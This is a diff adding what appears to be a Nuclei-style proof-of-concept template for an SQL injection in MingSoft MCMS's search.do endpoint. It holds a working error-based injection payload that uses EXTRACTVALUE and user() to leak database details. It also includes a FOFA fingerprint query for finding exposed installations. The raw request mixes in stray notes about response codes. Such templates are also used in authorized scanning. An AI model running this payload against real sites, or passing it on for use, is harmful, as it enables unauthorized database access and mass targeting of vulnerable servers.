@@ -1,0 +1,43 @@
+id: poc-ye6r58s92rg5ug1r
+info:
+  name: 铭飞CMS-SQL注入-search
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ye6r58s92rg5ug1r'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ye6r58s92rg5ug1r
+    fofa: body="铭飞MCMS" || body="/mdiy/formData/save.do" || body="static/plugins/ms/1.0.0/ms.js"
+http:
+- raw:
+  - 'GET /mcms/search.do''%20AND%20EXTRACTVALUE(5225,CONCAT(0x5c,111*111,user(),0x71767a7071))%20AND%20''smmD''=''smmD=1 HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept: */*
+
+
+    Connection: keep-alive
+
+
+    # 响应代码特征
+
+    500
+
+
+    # 响应内容特征
+
+    12321
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
